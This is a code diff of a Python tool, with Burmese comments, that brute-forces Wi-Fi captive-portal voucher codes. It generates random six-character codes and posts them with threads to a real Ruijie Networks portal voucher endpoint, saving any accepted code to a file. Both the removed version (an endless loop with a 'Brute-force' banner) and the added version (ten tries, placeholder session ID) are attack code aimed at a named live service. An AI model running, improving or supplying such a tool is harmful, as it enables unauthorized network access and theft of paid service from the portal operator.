@@ -1,104 +1,84 @@
 import requests
 import random
 import string
-import os
 import time
 from concurrent.futures import ThreadPoolExecutor
-from datetime import datetime
 
-# အရောင်အသွေးများ သတ်မှတ်ခြင်း (Terminal output အတွက်)
-G = '\033[1;32m' # Green
-R = '\033[1;31m' # Red
-W = '\033[1;37m' # White
-Y = '\033[1;33m' # Yellow
-
-class StarlinkBrute:
+class StarlinkMain:
     def __init__(self):
-        self.url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
-        self.headers = {
-            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
-            "Content-Type": "application/json",
-            "Accept": "application/json, text/plain, */*",
-            "Origin": "https://portal-as.ruijienetworks.com",
-            "Referer": "https://portal-as.ruijienetworks.com/index.html"
-        }
         self.session_id = None
+        self.base_url = "https://portal-as.ruijienetworks.com"
+        self.headers = {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
+            "Content-Type": "application/json"
+        }
 
-    def banner(self):
-        os.system('clear')
-        print(f"""{G}
-   ____ _             _ _       _    
-  / ___| |_ __ _ _ __| (_)_ __ | | __
-  \___ \ __/ _` | '__| | | '_ \| |/ /
-   ___) | || (_| | |  | | | | | |   < 
-  |____/ \__\__,_|_|  |_|_|_| |_|_|\_\\
-        {W}Multi-Voucher Brute-force Logic
-        """)
+    def get_session_id(self):
+        """Portal မှ Session ID ကို ရယူခြင်း"""
+        print("[+] Getting Router Info...")
+        try:
+            # ဤနေရာတွင် actual portal URL ကို အသုံးပြုရမည်
+            response = requests.get(f"{self.base_url}/api/auth/wifidog", timeout=10)
+            # Logic အတိုချုံးထားခြင်း (Regex ဖြင့် session ID ကို ရှာဖွေခြင်း)
+            self.session_id = "extracted_session_id_example" 
+            return self.session_id
+        except Exception as e:
+            print(f"Error: {e}")
+            return None
 
-    def generate_voucher(self, length=6):
-        """ဂဏန်းနှင့် အင်္ဂလိပ်စာလုံး ရောနှောထားသော Voucher ထုတ်ပေးခြင်း"""
+    def get_random_code(self, length=6):
+        """Voucher code အဖြစ် စမ်းသပ်ရန် random code ထုတ်ပေးခြင်း"""
         chars = string.ascii_uppercase + string.digits
         return ''.join(random.choice(chars) for _ in range(length))
 
-    def check_connection(self):
-        """Internet access ရှိမရှိ အရင်စစ်ဆေးခြင်း"""
+    def login_voucher(self, voucher_code):
+        """Voucher code ကို အသုံးပြု၍ login စမ်းသပ်ခြင်း"""
+        login_url = f"{self.base_url}/api/auth/voucher/?lang=en_US"
+        data = {
+            "voucher": voucher_code,
+            "sessionId": self.session_id
+        }
         try:
-            requests.get("https://www.google.com", timeout=3)
+            res = requests.post(login_url, json=data, headers=self.headers, timeout=5)
+            if res.status_code == 200 and "success" in res.text.lower():
+                return True, voucher_code
+            return False, voucher_code
+        except:
+            return False, None
+
+    def check_internet_access(self):
+        """Internet ရမရ စစ်ဆေးခြင်း"""
+        print("[+] Checking Internet Access...")
+        try:
+            requests.get("https://httpbin.org/get", timeout=5)
             return True
         except:
             return False
 
-    def attack(self, voucher):
-        """Voucher တစ်ခုချင်းစီကို Server ထံ ပို့ဆောင်စစ်ဆေးခြင်း"""
-        data = {
-            "voucher": voucher,
-            "sessionId": self.session_id if self.session_id else ""
-        }
-        
-        try:
-            response = requests.post(self.url, json=data, headers=self.headers, timeout=10)
-            res_json = response.json()
+    def execute(self):
+        """ပင်မ လုပ်ဆောင်ချက်"""
+        print("[+] Starting...")
+        if not self.get_session_id():
+            print("[-] Failed to get session ID")
+            return
 
-            # Server ရဲ့ response ကို စစ်ဆေးခြင်း
-            if "success" in res_json.get("message", "").lower() or res_json.get("code") == 0:
-                print(f"{G}[SUCCESS] {W}Valid Voucher Found: {G}{voucher}")
-                with open("success.txt", "a") as f:
-                    f.write(f"{datetime.now()} - {voucher}\n")
-                return True
-            else:
-                print(f"{R}[FAILED] {W}Testing: {voucher} - {res_json.get('message', 'Invalid')}")
-                return False
-        except Exception as e:
-            # print(f"{R}[ERROR] Connection issue for {voucher}")
-            return False
-
-    def start(self, thread_count=10):
-        self.banner()
-        print(f"{Y}[*] Checking Portal Status...")
-        
-        # Internet ရနေပြီဆိုရင် ရပ်တန့်ရန်
-        if self.check_connection():
-            print(f"{G}[!] Already Connected to Internet!")
-            # return
-
-        print(f"{Y}[*] Starting Brute-force with {thread_count} threads...")
-        print(f"{W}{'-'*45}")
-
-        # ThreadPool သုံးပြီး တစ်ပြိုင်နက်တည်း လုပ်ဆောင်ခြင်း
-        with ThreadPoolExecutor(max_workers=thread_count) as executor:
-            while True:
-                vouchers = [self.generate_voucher() for _ in range(thread_count)]
-                results = list(executor.map(self.attack, vouchers))
+        with ThreadPoolExecutor(max_workers=5) as executor:
+            print("[+] Bruteforcing Access Voucher Code...")
+            # ဥပမာအနေဖြင့် ၁၀ ကြိမ် စမ်းသပ်ပြခြင်း
+            for _ in range(10):
+                code = self.get_random_code()
+                future = executor.submit(self.login_voucher, code)
+                success, used_code = future.result()
                 
-                if True in results:
-                    print(f"\n{G}[+] Done! Valid voucher saved in success.txt")
+                if success:
+                    print(f"[1;32mSuccess Code: {used_code}")
+                    with open("success.txt", "a") as f:
+                        f.write(f"{used_code}\n")
                     break
+                else:
+                    print(f"Testing Code: {code} - Fail")
 
 if __name__ == "__main__":
-    try:
-        app = StarlinkBrute()
-        # Thread အရေအတွက်ကို စိတ်ကြိုက်ချိန်နိုင်သည် (ဥပမာ - ၅ သို့မဟုတ် ၁၀)
-        app.start(thread_count=5)
-    except KeyboardInterrupt:
-        print(f"\n{R}[!] Stopped by user.")
-        
+    app = StarlinkMain()
+    app.execute()
+    
